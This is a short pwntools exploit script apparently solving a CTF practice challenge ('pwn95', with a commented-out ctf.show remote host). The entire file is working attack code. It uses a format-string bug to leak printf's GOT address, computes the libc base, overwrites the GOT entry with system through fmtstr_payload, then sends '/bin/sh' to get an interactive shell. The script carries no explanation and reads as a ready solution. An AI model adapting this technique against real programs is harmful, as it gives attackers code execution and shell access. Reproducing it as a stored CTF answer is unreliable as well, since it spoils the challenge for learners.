from pwn import *

io = process("./pwn95")
# io = remote("dasctf_sixbytes.challenge.ctf.show", 28144)
context(os="linux", arch="i386")
# context(os="linux", arch="amd64", log_level='debug')
elf = ELF('./pwn95')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# def exec_fmt(payload):
#     io.sendline(payload)
#     info = io.recv()
#     return info
# auto = FmtStr(exec_fmt)
# offset = auto.offset
# print(offset)
gdb.attach(io)
offset = 6
printf_got = elf.got['printf']
payload = p32(printf_got) + ('%{}$s'.format(offset)).encode()
io.recvuntil(b'* *************************************')
io.recvuntil(b'* *************************************')
io.sendline(payload)
print(io.recvline())
# print(u32(io.recvuntil(b'\xf7')[-4:]))
libc_base = u32(io.recvuntil(b'\xf7')[-4:]) - 0x4fb60
print(hex(libc_base))
system = libc_base + 0x414f0
payload = fmtstr_payload(6, {printf_got: system})
io.send(payload)
io.send(b'/bin/sh')

io.interactive()
